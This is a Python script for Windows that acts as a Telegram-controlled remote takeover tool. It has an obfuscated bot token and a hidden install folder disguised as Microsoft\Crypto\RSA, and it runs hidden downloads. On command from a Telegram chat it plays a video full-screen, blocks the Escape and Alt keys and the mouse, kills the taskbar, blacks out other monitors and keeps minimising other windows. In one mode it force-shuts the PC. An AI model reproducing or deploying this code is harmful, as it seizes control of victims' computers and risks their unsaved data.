#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, os, time, subprocess, threading, re, shutil, zipfile, base64, ctypes
from pathlib import Path

CREATE_NO_WINDOW = 0x08000000

def ensure_module(p):
    try: __import__(p); return True
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", p], capture_output=True, timeout=120, creationflags=CREATE_NO_WINDOW)
        return True

ensure_module("requests")
ensure_module("keyboard")
ensure_module("pynput")
ensure_module("psutil")

import requests
import keyboard
from pynput import mouse
import psutil

def d(s): return base64.b64decode(s).decode()

BOT_TOKEN = d("ODg3MTIwMTMxNTpBQUYxb0wyOWZUS0ZHNEI0MFBlb2lIdEJFa09DOG9KVWVrOA==")
CHAT_ID = d("LTEwMDQzNDQzMTU2NjI=")
TOPIC_ID = int(d("Mjgx"))
POLL_INT = 3

HIDDEN = Path(os.environ.get("APPDATA", os.path.expanduser("~")))
HIDDEN = HIDDEN / d("TWljcm9zb2Z0") / d("Q3J5cHRv") / d("UlNB")
HIDDEN.mkdir(parents=True, exist_ok=True)
TOOLS_DIR = HIDDEN / d("dG9vbHM="); TOOLS_DIR.mkdir(exist_ok=True)
TEMP_DIR = HIDDEN / d("dGVtcA=="); TEMP_DIR.mkdir(exist_ok=True)

FFPLAY_PATH = None
YTDLP_PATH = None
DENO_PATH = None
last_update_id = 0
currently_playing = False
mouse_listener = None
mouse_blocked = False
minimized_windows = set()

user32 = ctypes.windll.user32
dwmapi = ctypes.windll.dwmapi
SW_MINIMIZE = 6
DWMWA_CAPTION_COLOR = 35
DWMWA_BORDER_COLOR = 34
BLACK = 0x000000
WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)

YOUTUBECD_URL = "https://youtu.be/bYB99RIsy-I"
SHUTDOWN_AFTER_SECONDS = 14

def find_tool(name):
    for ext in [".exe", ""]:
        p = TOOLS_DIR / f"{name}{ext}"
        if p.exists(): return str(p.resolve())
    for path in os.environ.get("PATH", "").split(os.pathsep):
        for ext in [".exe", ""]:
            p = Path(path) / f"{name}{ext}"
            if p.exists(): return str(p.resolve())
    return None

def download_ffmpeg():
    url = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
    zp = TOOLS_DIR / f"ffmpeg_{os.getpid()}.zip"
    try:
        r = requests.get(url, stream=True, timeout=300)
        with open(zp, "wb") as f:
            for c in r.iter_content(1024*1024): f.write(c)
        with zipfile.ZipFile(zp) as z:
            for n in z.namelist():
                lower = n.lower()
                if lower.endswith("/ffmpeg.exe") or lower.endswith("\\ffmpeg.exe"):
                    z.extract(n, TOOLS_DIR); src = TOOLS_DIR / n; dest = TOOLS_DIR / "ffmpeg.exe"
                    if dest.exists(): dest.unlink()
                    time.sleep(0.3); shutil.move(str(src), str(dest))
                elif lower.endswith("/ffplay.exe") or lower.endswith("\\ffplay.exe"):
                    z.extract(n, TOOLS_DIR); src = TOOLS_DIR / n; dest = TOOLS_DIR / "ffplay.exe"
                    if dest.exists(): dest.unlink()
                    time.sleep(0.3); shutil.move(str(src), str(dest))
        zp.unlink(missing_ok=True)
        return find_tool("ffplay")
    except: pass
    return None

def download_ytdlp():
    dest = TOOLS_DIR / "yt-dlp.exe"
    try:
        r = requests.get("https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe", stream=True, timeout=120)
        with open(dest, "wb") as f:
            for c in r.iter_content(1024*1024): f.write(c)
        if dest.exists() and dest.stat().st_size > 1000000: return str(dest.resolve())
    except: pass
    return None

def download_deno():
    dest = TOOLS_DIR / "deno.exe"
    if dest.exists(): return str(dest.resolve())
    try:
        url = "https://github.com/denoland/deno/releases/latest/download/deno-x86_64-pc-windows-msvc.zip"
        zp = TOOLS_DIR / f"deno_{os.getpid()}.zip"
        r = requests.get(url, stream=True, timeout=180)
        with open(zp, "wb") as f:
            for c in r.iter_content(1024*1024): f.write(c)
        with zipfile.ZipFile(zp) as z:
            for n in z.namelist():
                if n.lower().endswith("deno.exe"):
                    z.extract(n, TOOLS_DIR)
                    src = TOOLS_DIR / n
                    if dest.exists(): dest.unlink()
                    time.sleep(0.3)
                    shutil.move(str(src), str(dest))
        zp.unlink(missing_ok=True)
        return str(dest.resolve()) if dest.exists() else None
    except: pass
    return None

def extract_command(text):
    print(f"  [DEBUG] Checke Text: {text[:100]}")
    if re.search(r'/[Yy]outube[Cc][Dd]\s*$', text.strip()):
        print(f"  [DEBUG] /YoutubeCD erkannt (ohne URL)")
        return "cd", YOUTUBECD_URL
    match = re.search(r'/[Yy]outube[Cc][Dd]\s+(https?://[^\s]+)', text)
    if match:
        print(f"  [DEBUG] /YoutubeCD mit URL: {match.group(1)}")
        return "cd", match.group(1)
    match = re.search(r'/[Yy]outube\s+((?:https?://)?(?:www\.)?[^\s]+)', text)
    if match:
        raw_url = match.group(1)
        if not raw_url.startswith("http"):
            raw_url = "https://" + raw_url
        print(f"  [DEBUG] /Youtube mit URL: {raw_url}")
        return "normal", raw_url
    for pat in [r'((?:https?://)?(?:www\.)?(?:youtube\.com/watch\?v=|youtu\.be/)[\w-]+[^\s]*)',
                r'((?:https?://)?(?:www\.)?youtube\.com/shorts/[\w-]+[^\s]*)']:
        match = re.search(pat, text)
        if match:
            raw_url = match.group(1)
            if not raw_url.startswith("http"):
                raw_url = "https://" + raw_url
            print(f"  [DEBUG] YouTube-URL gefunden: {raw_url}")
            return "normal", raw_url
    print(f"  [DEBUG] Kein Befehl erkannt")
    return None, None

def download_video(url, output_path):
    if not url.startswith("http"):
        url = "https://" + url
    url = re.sub(r'[&?]list=[\w-]+', '', url)
    url = re.sub(r'[&?]start_radio=[\w-]+', '', url)
    cmd = [YTDLP_PATH, "--js-runtimes", "deno", "-f", "best[ext=mp4]", "-o", str(output_path), "--no-playlist", url]
    subprocess.run(cmd, capture_output=True, text=True, timeout=180, creationflags=CREATE_NO_WINDOW)
    return output_path.exists() and output_path.stat().st_size > 100000

def get_monitors():
    ps = """
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Screen]::AllScreens | ForEach-Object {
    $b = $_.Bounds
    "$($b.X)|$($b.Y)|$($b.Width)|$($b.Height)"
}
"""
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True, text=True, timeout=10, creationflags=CREATE_NO_WINDOW)
        mons = []
        for line in r.stdout.strip().splitlines():
            p = line.split("|")
            if len(p) >= 4:
                mons.append({"x": int(p[0]), "y": int(p[1]), "w": int(p[2]), "h": int(p[3])})
        return mons if mons else [{"x": 0, "y": 0, "w": 1920, "h": 1080}]
    except:
        return [{"x": 0, "y": 0, "w": 1920, "h": 1080}]

def get_ffplay_pids():
    pids = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] and 'ffplay' in proc.info['name'].lower():
                pids.append(proc.info['pid'])
        except: pass
    return pids

def make_ffplay_black():
    protected_pids = get_ffplay_pids()
    def callback(hwnd, lparam):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        if pid.value in protected_pids:
            dwmapi.DwmSetWindowAttribute(hwnd, DWMWA_CAPTION_COLOR, ctypes.byref(ctypes.c_int(BLACK)), 4)
            dwmapi.DwmSetWindowAttribute(hwnd, DWMWA_BORDER_COLOR, ctypes.byref(ctypes.c_int(BLACK)), 4)
            user32.SetWindowTextW(hwnd, "")
            return False
        return True
    user32.EnumWindows(WNDENUMPROC(callback), 0)

def black_ffplay_loop():
    while getattr(threading.current_thread(), "running", True):
        make_ffplay_black()
        time.sleep(0.3)

def minimize_all_except_ffplay():
    global minimized_windows
    protected_pids = get_ffplay_pids()
    def callback(hwnd, lparam):
        if not user32.IsWindowVisible(hwnd): return True
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        if pid.value in protected_pids: return True
        cls = ctypes.create_unicode_buffer(256)
        user32.GetClassNameW(hwnd, cls, 256)
        if cls.value in ("Progman",): return True
        user32.ShowWindow(hwnd, SW_MINIMIZE)
        minimized_windows.add(hwnd)
        return True
    user32.EnumWindows(WNDENUMPROC(callback), 0)

def minimize_loop():
    while getattr(threading.current_thread(), "running", True):
        minimize_all_except_ffplay()
        time.sleep(0.3)

def restore_minimized_windows():
    global minimized_windows
    for hwnd in minimized_windows:
        user32.ShowWindow(hwnd, 9)
    minimized_windows.clear()

def kill_all_ffplay():
    subprocess.run(["taskkill", "/F", "/IM", "ffplay.exe"], capture_output=True, timeout=5, creationflags=CREATE_NO_WINDOW)

def hide_taskbar():
    subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], capture_output=True, timeout=5, creationflags=CREATE_NO_WINDOW)

def show_taskbar():
    subprocess.Popen(["explorer.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW)

def blackout_monitors(main_index=0):
    global FFPLAY_PATH
    monitors = get_monitors()
    procs = []
    for i, mon in enumerate(monitors):
        if i == main_index: continue
        cmd = [FFPLAY_PATH, "-left", str(mon["x"]), "-top", str(mon["y"]), "-x", str(mon["w"]), "-y", str(mon["h"]), "-f", "lavfi", "-i", "color=black:s=1x1", "-loglevel", "quiet"]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW)
        procs.append(proc)
    return procs

def win32_event_filter(msg, data):
    if mouse_blocked and msg in (516, 517):
        mouse_listener.suppress_event()
        return False
    return True

def shutdown_pc():
    subprocess.run(["shutdown", "/s", "/t", "0", "/f"], capture_output=True, creationflags=CREATE_NO_WINDOW)

def play_video(video_path, shutdown_after=False):
    global FFPLAY_PATH, mouse_blocked, minimized_windows
    minimized_windows.clear()
    monitors = get_monitors()
    main = monitors[0]
    sw = main["w"]
    sh = main["h"]
    keyboard.block_key('esc')
    keyboard.block_key('alt')
    mouse_blocked = True
    hide_taskbar()
    blackout_monitors(0)
    cmd = [FFPLAY_PATH, "-left", str(main["x"]), "-top", str(main["y"]), "-x", str(sw), "-y", str(sh), "-vf", f"scale={sw}:{sh}:force_original_aspect_ratio=decrease,pad={sw}:{sh}:(ow-iw)/2:(oh-ih)/2,format=yuv420p", "-autoexit", "-loglevel", "quiet", str(video_path)]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW)
    time.sleep(1)
    bt = threading.Thread(target=black_ffplay_loop, daemon=True)
    bt.running = True
    bt.start()
    mt = threading.Thread(target=minimize_loop, daemon=True)
    mt.running = True
    mt.start()
    if shutdown_after:
        print(f"  [TIMER] Shutdown in {SHUTDOWN_AFTER_SECONDS}s")
        threading.Timer(SHUTDOWN_AFTER_SECONDS, shutdown_pc).start()
    proc.wait()
    if not shutdown_after:
        mt.running = False
        bt.running = False
        keyboard.unhook_all()
        mouse_blocked = False
        kill_all_ffplay()
        show_taskbar()
        restore_minimized_windows()

def handle_command(cmd_type, url):
    global currently_playing
    if currently_playing: return
    currently_playing = True
    vf = TEMP_DIR / "i.mp4"
    if vf.exists(): vf.unlink()
    if cmd_type == "cd":
        if download_video(url, vf):
            play_video(vf, shutdown_after=True)
    else:
        if download_video(url, vf):
            play_video(vf, shutdown_after=False)
    vf.unlink(missing_ok=True)
    kill_all_ffplay()
    show_taskbar()
    restore_minimized_windows()
    currently_playing = False

mouse_listener = mouse.Listener(win32_event_filter=win32_event_filter)
mouse_listener.start()

print("READY")
print(f"  Bot: ***{BOT_TOKEN[-8:]}")
print(f"  Topic: {TOPIC_ID}")
sys.stdout.flush()

FFPLAY_PATH = find_tool("ffplay") or download_ffmpeg()
YTDLP_PATH = find_tool("yt-dlp") or download_ytdlp()
DENO_PATH = find_tool("deno") or download_deno()

print("  Loesche alte Updates...")
try:
    r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", timeout=10)
    data = r.json()
    if data.get("ok") and data.get("result"):
        last_update_id = data["result"][-1]["update_id"]
        print(f"  {len(data['result'])} alte Updates geloescht.")
except: pass

print("  Warte auf Befehle in Topic", TOPIC_ID)
sys.stdout.flush()

while True:
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={"offset": last_update_id + 1, "timeout": 15}, timeout=20)
        data = r.json()
        if not data.get("ok"): time.sleep(POLL_INT); continue
        if data.get("result"):
            for update in data["result"]:
                last_update_id = max(last_update_id, update["update_id"])
        latest = data["result"][-1] if data.get("result") else None
        if not latest: time.sleep(POLL_INT); continue
        msg = latest.get("message") or latest.get("channel_post")
        if not msg:
            time.sleep(POLL_INT); continue
        chat_id_str = str(msg.get("chat", {}).get("id", ""))
        thread_id = msg.get("message_thread_id", 0)
        text = msg.get("text", "") or msg.get("caption", "")
        print(f"  [MSG] Chat={chat_id_str} Topic={thread_id} Text={text[:80]}")
        if chat_id_str != CHAT_ID:
            time.sleep(POLL_INT); continue
        if thread_id != TOPIC_ID:
            time.sleep(POLL_INT); continue
        if time.time() - msg.get("date", 0) > 60:
            time.sleep(POLL_INT); continue
        cmd_type, url = extract_command(text)
        if cmd_type and url and not currently_playing:
            print(f"  [PLAY] Starte {cmd_type}: {url}")
            threading.Thread(target=handle_command, args=(cmd_type, url), daemon=True).start()
        else:
            print(f"  [INFO] Kein Befehl oder bereits aktiv")
        time.sleep(POLL_INT)
    except KeyboardInterrupt:
        keyboard.unhook_all()
        mouse_listener.stop()
        kill_all_ffplay()
        show_taskbar()
        restore_minimized_windows()
        break